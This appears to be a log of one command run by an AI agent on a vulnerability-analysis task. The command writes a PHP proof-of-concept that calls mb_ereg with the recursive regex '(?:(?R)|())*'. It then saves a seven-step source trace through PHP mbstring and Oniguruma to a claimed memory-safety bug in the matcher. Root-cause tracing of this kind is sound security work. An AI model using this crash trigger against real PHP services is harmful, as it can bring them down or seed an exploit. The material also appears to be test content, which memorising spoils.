message:
Command `cd /workspace && python3 - <<'PY'
from pathlib import Path
p=Path('poc10.php')
p.write_text('<?php mb_regex_encoding("UTF-8"); var_dump(mb_ereg("(?:(?R)|())*", "x")); ?>')
trace=[
 {"step":1,"file":"ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg)","line":975,"var":"arg_pattern","code":"re = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, options, MBREX(current_mbctype), syntax);","note":"The direct mb_ereg API compiles user-controlled regex text into an internal Oniguruma regex object."},
 {"step":2,"file":"oniguruma/src/oniguruma.h","function":"<global>","line":505,"var":"ONIG_SYN_OP2_QMARK_PERL_SUBEXP_CALL","code":"#define ONIG_SYN_OP2_QMARK_PERL_SUBEXP_CALL     (1U<<27) /* (?R), (?&name)... */","note":"Perl subexpression recursion is enabled, so the payload can introduce a recursive node into the pattern AST."},
 {"step":3,"file":"oniguruma/src/regcomp.c","function":"infinite_recursive_call_check_trav","line":4095,"var":"NODE_IS_RECURSION(node)","code":"if (NODE_IS_RECURSION(node) && NODE_IS_CALLED(node)) {","note":"Recursive nodes are accepted into compilation and are handled specially by the compiler's recursion checks."},
 {"step":4,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5455,"var":"body","code":"OnigLen d = node_min_byte_len(body, env);","note":"A repeated body that can match empty reaches the quantifier tuning path that computes minimum byte length."},
 {"step":5,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5458,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"For zero-minimum bodies the compiler recurses into the body graph to classify empty-repeat behavior."},
 {"step":6,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4912,"var":"BODY_MAY_BE_EMPTY_REC","code":"if (NODE_IS_RECURSION(node)) { return BODY_MAY_BE_EMPTY_REC; }","note":"A recursion node in the repeated body is the exact special case this vulnerable analysis distinguishes."},
 {"step":7,"file":"oniguruma/src/regexec.c","function":"STACK_EMPTY_CHECK_MEM_REC","line":2063,"var":"generated matcher state","code":"#define STACK_EMPTY_CHECK_MEM_REC(isnull,sid,s,reg) do { ... }","note":"The resulting empty-repeat metadata is later consumed by the recursion-aware matcher, where the memory-safety bug manifests."}
]
Path('candidate_trace.json').write_text(__import__('json').dumps(trace))
PY
cat /workspace/candidate_trace.json && echo '
---SUBMIT---' && true` executed with exit code 0.
